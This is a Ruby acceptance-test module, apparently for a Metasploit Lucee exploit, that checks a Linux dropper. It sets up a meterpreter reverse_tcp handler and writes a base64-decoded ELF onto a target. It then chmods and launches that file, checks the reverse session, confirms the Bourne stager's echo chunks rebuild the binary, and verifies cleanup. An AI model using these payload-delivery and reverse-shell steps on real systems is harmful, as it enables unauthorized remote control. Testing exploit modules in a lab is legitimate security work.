# frozen_string_literal: true

require_relative '../lucee_bash/acceptance'

# Preserve the real command stager; independent native ELF controls gate owners.
module LuceeDropperSessions
  include LuceeSessions

  def dropper_arch
    self.class.metadata.fetch(:dropper_arch)
  end

  def session_families
    { 'linux-' + dropper_arch => [1, 'linux/' + dropper_arch + '/meterpreter/reverse_tcp', 'meterpreter'] }
  end

  def session_default_options
    { 'linux-x64' => ['PAYLOAD'] }
  end

  def session_owner_options(options)
    options.merge('CMDSTAGER::TEMP' => @dropper_directory)
  end

  def controlled_path(path)
    canonical = Pathname.new(path).cleanpath.to_s
    if @dropper_directory && File.dirname(canonical) == @dropper_directory
      raise ArgumentError, 'Unexpected controlled Bourne filename' unless File.basename(canonical).match?(/\A[A-Za-z]{5}(?:\.b64)?\z/)

      return canonical
    end

    super
  end

  def dropper_directory_empty
    output, = rc_command('dropper-directory-contents', 'target', 'find', @dropper_directory, '-mindepth', '1', '-maxdepth', '1', '-print')
    expect(output).to eq('')
  end

  def native_session(family)
    _target, payload, = session_families.fetch(family)
    attempt = { family: family, owner: 'exploit/multi/handler', payload: payload }
    @rc[:attempts] << attempt
    path = "/tmp/module-target-lucee-native-#{Process.pid}-#{family}"
    log_path = path + '-output'
    expect(file(path)).to eq('exists' => false)
    console_command('back')
    console_command('use exploit/multi/handler')
    { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => LaravelSessions::CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60, 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 }.each do |key, value|
      expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option')
    end
    attempt[:handler_output] = console_command('run -j -z')
    expect(attempt.fetch(:handler_output)).not_to include('Exploit failed', 'Exploit aborted')
    generated = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;SaltDeploymentSessionControl.executable(job,#{payload.inspect},framework);end")
    attempt[:generated] = generated
    bytes = Base64.strict_decode64(generated.fetch('executable_base64'))
    expect(bytes.byteslice(0, 4)).to eq("\x7fELF".b)
    expect(bytes.getbyte(4)).to eq(dropper_arch == 'x64' ? 2 : 1)
    expect(bytes.byteslice(18, 2).unpack1('v')).to eq(dropper_arch == 'x64' ? 62 : 3)
    command = session_exec_argv('sh', '-c', 'base64 -d > "$1" && chmod 700 "$1" && sha256sum "$1"', 'native-elf', path)
    output, error, status = Open3.capture3(*command, stdin_data: Base64.strict_encode64(bytes))
    attempt[:install] = { argv: command, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    expect(output.split.first).to eq(generated.fetch('executable_sha256'))
    attempt[:physical_executable] = file(path)
    expect(attempt.fetch(:physical_executable)).to eq('exists' => true, 'uid' => 0, 'base64' => generated.fetch('executable_base64'))
    command = session_exec_argv('sh', '-c', 'output=$1; shift; exec "$@" > "$output" 2>&1', 'native-launch', log_path, path, detached: true)
    output, error, status = Open3.capture3(*command)
    attempt[:launch] = { argv: command, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    use_session(family, attempt, 'exploit/multi/handler')
    passed = true
  ensure
    primary = $ERROR_INFO
    attempt[:failure] = { type: primary.class.name, message: primary.message } if primary
    begin
      attempt[:final_process_state] = process_state
      attempt[:process_output] = file(log_path) if log_path
      rc_command('remove-native-executable', 'target', 'rm', '-f', '--', path, log_path) if path
      expect(file(path)).to eq('exists' => false) if path
      expect(file(log_path)).to eq('exists' => false) if log_path
      cleanup_session
      @rc[:calibrated] << family if passed
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      attempt[:cleanup_error] = { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      rc_save
    end
  end

  def use_session(family, attempt, owner)
    if owner == laravel_owner
      values = rc_json('framework.instance_variable_get(:@lucee_dropper_events)')
      current = values.drop(@rc.fetch(:dropper_cursor, 0))
      @rc[:dropper_cursor] = values.length
      attempt[:dropper_events] = current
      rc_save
      executable = current.find { |row| row['method'] == 'generate_payload_exe' && row['event'] == 'return' }
      stager = current.find { |row| row['method'] == 'generate_cmdstager' && row['event'] == 'return' }
      expect(executable).not_to be_nil
      expect(stager).not_to be_nil
      bytes = Base64.strict_decode64(executable.fetch('executable_base64'))
      expect(bytes.getbyte(4)).to eq(dropper_arch == 'x64' ? 2 : 1)
      expect(bytes.byteslice(18, 2).unpack1('v')).to eq(dropper_arch == 'x64' ? 62 : 3)
      expect(stager.fetch('flavor')).to eq('bourne')
      chunks = stager.fetch('commands').flat_map { |command| command.scan(%r{echo -n ([A-Za-z0-9+/=]+)>>}).flatten }
      expect(Base64.strict_decode64(chunks.join)).to eq(bytes)
      expect(stager.fetch('commands').join).to include(@dropper_directory)
      await_session(session_families.fetch(family)[1], owner)
      expect(executable.fetch('fork')).to be(false)
      attempt[:physical_owner_executable] = file(stager.fetch('decoded_path'))
      attempt[:physical_owner_encoded] = file(stager.fetch('encoded_path'))
      expect(attempt.fetch(:physical_owner_executable)).to eq('exists' => true, 'uid' => 0, 'base64' => executable.fetch('executable_base64'))
      expect(attempt.fetch(:physical_owner_encoded)).to eq('exists' => true, 'uid' => 0, 'base64' => Base64.strict_encode64(chunks.join))
    end
    result = super
    if owner == laravel_owner
      commands = attempt.fetch(:events).select { |row| row['event'] == 'call' && row['method'] == 'execute_command' }.map { |row| Base64.strict_decode64(row.fetch('command_base64')) }
      expect(commands).to eq(stager.fetch('commands'))
      dropper_directory_empty
      expect(file(stager.fetch('decoded_path'))).to eq('exists' => false)
      expect(file(stager.fetch('encoded_path'))).to eq('exists' => false)
      attempt[:normal_stager_cleanup_verified] = true
    end
    result
  ensure
    rc_save
  end
end
